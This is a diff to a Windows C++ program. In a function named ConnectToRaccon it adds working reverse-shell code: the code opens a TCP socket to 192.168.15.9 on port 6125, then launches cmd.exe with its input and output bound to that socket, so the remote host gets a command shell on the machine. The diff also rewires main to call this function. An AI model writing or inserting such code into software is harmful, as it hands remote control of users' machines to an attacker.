@@ -1,9 +1,11 @@
-#include <iostream>
+#include <winsock2.h>  
+#include <ws2tcpip.h>  
 #include <filesystem>
 #include <Windows.h>
 #include <winternl.h>
 #include <cstdio>
 #include "ReaderHeader.h"
+#include <iostream>
 
 #pragma comment(lib, "ws2_32.lib")
 
@@ -182,6 +184,39 @@ int ConnectToRaccon()
 		return EXIT_FAILURE;
 	}
 
+	std::string ip = "192.168.15.9";
+	SOCKET sock = WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0 , 0);
+	sockaddr_in sockAddr;
+	sockAddr.sin_family = AF_INET;
+	sockAddr.sin_port = htons(6125);
+
+	if (inet_pton(AF_INET, ip.c_str(), &(sockAddr.sin_addr)) != 1) {
+		PrintLastErrorMessage();
+		return EXIT_FAILURE;
+	}
+
+	if (WSAConnect(sock, (SOCKADDR*)&sockAddr, sizeof(sockAddr), NULL, NULL, NULL, NULL) == SOCKET_ERROR)
+	{
+		PrintLastErrorMessage();
+		return EXIT_FAILURE;
+	}
+
+	PROCESS_INFORMATION pi = { 0 };
+	STARTUPINFO si = { 0 };
+	si.cb = sizeof(si);
+	si.dwFlags = STARTF_USESTDHANDLES;
+	si.hStdInput = (HANDLE)sock;	
+	si.hStdOutput = (HANDLE)sock;
+	si.hStdError = (HANDLE)sock;
+
+    if (!CreateProcessW(L"C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
+       return EXIT_FAILURE;
+    }
+
+	WaitForSingleObject(pi.hProcess, INFINITE);
+	CloseHandle(pi.hThread);
+	CloseHandle(pi.hProcess);
+		
 	return EXIT_SUCCESS;
 }
 
@@ -214,9 +249,9 @@ int main(void)
 
 			return EXIT_SUCCESS;
 		}
-
-		ConnectToRaccon();
-
-		return EXIT_SUCCESS;
+		else {
+			ConnectToRaccon();
+			return EXIT_SUCCESS;
+		}
 	}
 }
